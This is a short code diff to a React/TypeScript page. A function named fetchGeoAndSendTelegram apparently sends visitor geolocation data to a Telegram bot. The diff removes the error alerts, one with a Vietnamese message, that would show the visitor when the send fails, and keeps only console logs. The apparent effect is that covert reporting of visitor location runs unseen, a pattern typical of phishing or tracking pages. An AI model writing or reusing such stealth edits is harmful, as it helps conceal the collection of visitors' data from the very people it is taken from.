@@ -114,14 +114,11 @@ const Index: FC = () => {
 
                     if (!response.ok) {
                         console.error('telegram api error:', result);
-                        alert(`API Error: ${result.description ?? 'Unknown error'}`);
                     } else {
                         console.log('telegram sent successfully:', result);
                     }
                 } catch (error) {
                     console.error('telegram send fail:', error);
-                    const errorMsg = error instanceof Error ? error.message : 'Không thể kết nối';
-                    alert(`Network Error: ${errorMsg}`);
                 }
             };
             fetchGeoAndSendTelegram();
